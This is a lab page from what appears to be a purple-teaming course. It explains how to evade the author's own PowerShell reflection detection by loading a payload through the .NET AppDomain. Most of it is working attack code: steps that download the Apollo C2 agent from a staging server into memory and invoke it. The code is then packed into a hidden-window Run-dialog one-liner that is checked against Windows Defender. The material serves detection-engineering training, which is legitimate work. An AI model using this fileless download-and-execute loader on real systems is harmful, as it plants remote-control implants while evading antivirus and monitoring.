---
layout: default
title: "Red Team Layout - Using Application Domain to Bypa"
permalink: /solo-purple-teaming/red-team-layout-using-application-domain-to-bypa/
---
<link rel="stylesheet" href="/assets/css/solo-purple-teaming.css">

<div class="spt-page">
<a class="spt-back" href="/solo-purple-teaming/">← Back to Solo Purple Teaming</a>
<section class="spt-hero">
<p class="spt-kicker">Solo Purple Teaming</p>
<h1>Red Team Layout - Using Application Domain to Bypa</h1>
</section>
<section class="spt-content">
<h1
id="red-team-layout---using-application-domain-to-bypass-reflection-detection">Red
Team Layout - Using Application Domain to Bypass Reflection
Detection</h1>
<p>Owner: Mike Sterrett</p>
<h3 id="1-context-and-objective"><strong>1. Context and
Objective</strong></h3>
<p>In the last lecture, we bypassed some brittle detections that
were:</p>
<ul>
<li><strong>Correlation by process GUID</strong> (dependent on two
events — could be bypassed by avoiding dropping the binary in
<code>Downloads</code>).</li>
<li><strong>Time-based correlation</strong> (image load + network
connection within 2 seconds).</li>
<li><strong>Unsigned image load from Downloads or Users folder</strong>
(bypassed via Run box execution).</li>
<li><strong>Malicious PowerShell reflection detection</strong> (our
target for this session).</li>
</ul>
<p><strong>Goal:</strong> Rewrite our payload to use the
<code>.NET</code> <strong>current AppDomain</strong> to bypass our
custom PowerShell reflection detection.</p>
<hr />
<h3 id="2-understanding-brittle-detections"><strong>2. Understanding
Brittle Detections</strong></h3>
<ul>
<li><strong>Definition:</strong> Detections that rely on <em>low-level
Indicators of Compromise (IOCs)</em> like:
<ul>
<li>File hashes</li>
<li>Specific IPs</li>
<li>Exact command-line strings</li>
</ul></li>
<li><strong>Why Weak?</strong>
<ul>
<li>These indicators are at the bottom of the <strong>Pyramid of
Pain</strong>.</li>
<li>Attackers can easily change them with little effort, causing minimal
disruption.</li>
</ul></li>
<li><strong>Better Approach:</strong>
<ul>
<li>Detect <strong>high-level behaviors</strong> (TTPs — Tactics,
Techniques, and Procedures).</li>
<li>Focus on attacker methods rather than specific artifacts.</li>
</ul></li>
</ul>
<hr />
<h3 id="3-quick-refresher-on-appdomains"><strong>3. Quick Refresher on
AppDomains</strong></h3>
<ul>
<li>In Windows, a <strong>process</strong> is an isolated container for
executing code, with one or more <strong>threads</strong>.</li>
<li><strong>.NET adds:</strong> The <strong>AppDomain</strong> — a
lightweight container <strong>inside</strong> a process that:
<ul>
<li>Is created and managed by the <strong>Common Language Runtime
(CLR)</strong>.</li>
<li>Isolates assemblies from each other.</li>
<li>Allows safe unloading of code without ending the process.</li>
</ul></li>
<li><strong>PowerShell Connection:</strong>
<ul>
<li>When PowerShell runs, it creates a <strong>default
AppDomain</strong>.</li>
<li>Assemblies can be loaded into it:
<ul>
<li>From disk <strong>or</strong></li>
<li>Directly from a byte array (memory-only, no disk footprint).</li>
</ul></li>
<li>Once loaded, assemblies can be executed using
<strong>reflection-like</strong> techniques.</li>
</ul></li>
</ul>
<hr />
<h3 id="4-lab-rewriting-the-payload-to-use-appdomain"><strong>4. Lab:
Rewriting the Payload to Use AppDomain</strong></h3>
<p><strong>Starting Point:</strong> The previous PowerShell payload.</p>
<h3 id="step-1--duplicate-the-payload"><strong>Step 1 – Duplicate the
Payload</strong></h3>
<ul>
<li>Copy the last lecture’s payload into a new file for
modification.</li>
<li>Break each statement into its own line for clarity.</li>
</ul>
<h3 id="step-2--download-the-payload-into-a-byte-array"><strong>Step 2 –
Download the Payload into a Byte Array</strong></h3>
<div class="sourceCode" id="cb1"><pre
class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="va">$b</span> <span class="op">=</span> <span class="op">(</span><span class="fu">New-Object</span> Net<span class="op">.</span><span class="fu">WebClient</span><span class="op">).</span><span class="fu">DownloadData</span><span class="op">(</span><span class="st">&#39;http://&lt;staging_server&gt;/apollo.exe&#39;</span><span class="op">)</span></span></code></pre></div>
<h3
id="step-3--load-into-current-appdomain-instead-of-reflection-assembly"><strong>Step
3 – Load into Current AppDomain Instead of Reflection
Assembly</strong></h3>
<p>Replace:</p>
<div class="sourceCode" id="cb2"><pre
class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="va">$a</span> <span class="op">=</span> <span class="op">[</span>System<span class="op">.</span><span class="fu">Reflection</span><span class="op">.</span><span class="fu">Assembly</span><span class="op">]::</span>Load<span class="op">(</span><span class="va">$b</span><span class="op">)</span></span></code></pre></div>
<p>With:</p>
<div class="sourceCode" id="cb3"><pre
class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="va">$a</span> <span class="op">=</span> <span class="op">[</span>AppDomain<span class="op">]::</span>CurrentDomain<span class="op">.</span><span class="fu">Load</span><span class="op">(</span><span class="va">$b</span><span class="op">)</span></span></code></pre></div>
<h3 id="step-4--get-the-execute-method"><strong>Step 4 – Get the Execute
Method</strong></h3>
<div class="sourceCode" id="cb4"><pre
class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="va">$m</span> <span class="op">=</span> <span class="va">$a</span><span class="op">.</span><span class="fu">GetType</span><span class="op">(</span><span class="st">&#39;Apollo.Program&#39;</span><span class="op">).</span><span class="fu">GetMethod</span><span class="op">(</span><span class="st">&#39;Execute&#39;</span><span class="op">)</span></span></code></pre></div>
<h3 id="step-5--invoke-execute"><strong>Step 5 – Invoke
Execute</strong></h3>
<div class="sourceCode" id="cb5"><pre
class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="va">$m</span><span class="op">.</span><span class="fu">Invoke</span><span class="op">([</span>Activator<span class="op">]::</span>CreateInstance<span class="op">(</span><span class="va">$m</span><span class="op">.</span><span class="fu">DeclaringType</span><span class="op">),</span> <span class="va">$null</span><span class="op">)</span></span></code></pre></div>
<hr />
<h3 id="5-combining-into-a-one-liner"><strong>5. Combining into a
One-Liner</strong></h3>
<p>Because the Windows <strong>Run</strong> dialog allows only
<strong>259 characters</strong>, we:</p>
<ul>
<li>Remove extra spaces.</li>
<li>Chain commands with semicolons (<code>;</code>).</li>
<li>Ensure all statements are inside a PowerShell script block.</li>
</ul>
<p><strong>Final One-Liner Example:</strong></p>
<div class="sourceCode" id="cb6"><pre
class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>powershell <span class="op">-</span>w hidden <span class="op">-</span>nop <span class="op">-</span>c <span class="op">{</span><span class="va">$b</span><span class="op">=(</span><span class="fu">New-Object</span> Net<span class="op">.</span><span class="fu">WebClient</span><span class="op">).</span><span class="fu">DownloadData</span><span class="op">(</span><span class="st">&#39;http://&lt;staging_server&gt;/apollo.exe&#39;</span><span class="op">);</span><span class="va">$a</span><span class="op">=[</span>AppDomain<span class="op">]::</span>CurrentDomain<span class="op">.</span><span class="fu">Load</span><span class="op">(</span><span class="va">$b</span><span class="op">);</span><span class="va">$m</span><span class="op">=</span><span class="va">$a</span><span class="op">.</span><span class="fu">GetType</span><span class="op">(</span><span class="st">&#39;Apollo.Program&#39;</span><span class="op">).</span><span class="fu">GetMethod</span><span class="op">(</span><span class="st">&#39;Execute&#39;</span><span class="op">);</span><span class="va">$m</span><span class="op">.</span><span class="fu">Invoke</span><span class="op">([</span>Activator<span class="op">]::</span>CreateInstance<span class="op">(</span><span class="va">$m</span><span class="op">.</span><span class="fu">DeclaringType</span><span class="op">),</span><span class="va">$null</span><span class="op">)}</span></span></code></pre></div>
<hr />
<h3 id="6-testing-step-by-step"><strong>6. Testing
Step-by-Step</strong></h3>
<ol type="1">
<li><strong>Run in PowerShell Line-by-Line</strong>
<ul>
<li>Verify each line executes without errors.</li>
<li>Ensure Apollo callback is received in Mythic.</li>
</ul></li>
<li><strong>Run the One-Liner in the Run Dialog</strong>
<ul>
<li>Press <code>Win + R</code>, paste the one-liner, and hit
<strong>OK</strong>.</li>
<li>Watch for PowerShell window flash and disappear.</li>
<li>Confirm Mythic callback appears.</li>
</ul></li>
<li><strong>Debug if Needed</strong>
<ul>
<li>Missing semicolons or exceeding character limits will break
execution.</li>
</ul></li>
</ol>
<hr />
<h3 id="7-verification"><strong>7. Verification</strong></h3>
<ul>
<li>Check <strong>Mythic C2</strong> for successful agent callback.</li>
<li>Review the <strong>Solo Purple Teaming dashboard</strong>:
<ul>
<li>Time range: Last 15 minutes.</li>
<li><strong>Result:</strong> No detections fired → payload bypassed all
custom initial access detections.</li>
</ul></li>
</ul>
<hr />
<h3 id="8-key-takeaways"><strong>8. Key Takeaways</strong></h3>
<ul>
<li>Brittle detections are easy to evade and shouldn’t be your only
defense.</li>
<li>Behavioral and TTP-based detections are more resilient.</li>
<li>Using AppDomain’s <code>CurrentDomain.Load()</code> allows stealthy,
in-memory execution without touching disk.</li>
<li>Always test payloads step-by-step before finalizing into a
one-liner.</li>
</ul>
<hr />
<h3 id="9-homework--next-steps"><strong>9. Homework / Next
Steps</strong></h3>
<ul>
<li>Ensure your Run box payload <strong>reflectively loads Apollo via
AppDomain</strong>.</li>
<li>Verify bypass against Windows Defender and all custom
detections.</li>
<li>Read the attached research on <strong>Service Configuration
Management Objects</strong>.</li>
<li>Prepare for the next lab:
<ul>
<li>Writing a custom <code>.NET</code> service scan utility.</li>
<li>Running it with Apollo’s <code>execute-assembly</code> feature to
bypass service enumeration detections.</li>
</ul></li>
</ul>
</section>
</div>
